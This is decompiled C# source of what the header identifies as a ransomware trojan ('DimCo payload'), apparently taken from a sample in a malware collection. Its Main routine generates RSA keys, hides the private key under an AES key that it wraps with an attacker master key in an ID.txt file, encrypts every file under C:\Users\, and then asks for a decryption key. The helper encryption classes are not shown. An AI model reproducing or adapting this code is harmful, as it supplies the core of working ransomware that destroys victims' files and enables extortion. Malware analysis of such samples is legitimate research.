// Decompiled with JetBrains decompiler
// Type: DimCo_payload.Program
// Assembly: DimCo payload, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6D97B6CD-FB99-4BFA-8324-BC32038C0234
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Ransom.MSIL.Encoder.gen-23bdeb9ae6a8f414c33ed8baf2de46477d0bc7f469dd543d60332a04e0b7c039.exe

using Newtonsoft.Json;
using System;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace DimCo_payload
{
  internal static class Program
  {
    public static byte[] Base64Decode(string base64EncodedData) => Convert.FromBase64String(base64EncodedData);

    private static void decryption()
    {
      Console.WriteLine("key: ");
      Program.setup(Console.ReadLine());
    }

    private static void setup(string xml)
    {
      foreach (string str in global.encrypted)
      {
        try
        {
          if (global.Keys.PrivateKey == null)
            break;
          Console.WriteLine("decrypting " + str);
          Tuple<byte[], byte[]> encoded = JsonConvert.DeserializeObject<Tuple<byte[], byte[]>>(File.ReadAllText(str));
          File.WriteAllBytes(str, DimCo_payload.Encryption.Encryption.Decrypt_File_AESRSA(encoded, xml));
          File.Move(str, Path.ChangeExtension(str, (string) null));
        }
        catch
        {
          Console.WriteLine("Incorrect key. Try again.");
          Program.decryption();
        }
      }
    }

    public static string Base64Encode(byte[] plainText) => Convert.ToBase64String(plainText);

    public static string[] Split(this string str, string separator) => Regex.Split(str, separator);

    private static void Main()
    {
      global.Keys = DimCo_payload.Encryption.Encryption.RSA.GenerateKeys(2048);
      string s = DimCo_payload.Encryption.Encryption.RandomString(16, 16);
      byte[] plainText = DimCo_payload.Encryption.Encryption.AES.AES_Encrypt(Encoding.UTF8.GetBytes(global.Keys.PrivateKey), Encoding.UTF8.GetBytes(s));
      File.WriteAllText("ID.txt", Program.Base64Encode(DimCo_payload.Encryption.Encryption.RSA.Encrypt(Encoding.UTF8.GetBytes(s), 2048, global.masterkey)) + "<ID>" + Program.Base64Encode(plainText));
      DimCo_payload.Encryption.Encryption.Encrypt_Dir("C:\\Users\\", global.Keys.PublicKey);
      Program.decryption();
      Application.SetCompatibleTextRenderingDefault(false);
      Application.Run((Form) new Form1());
    }
  }
}
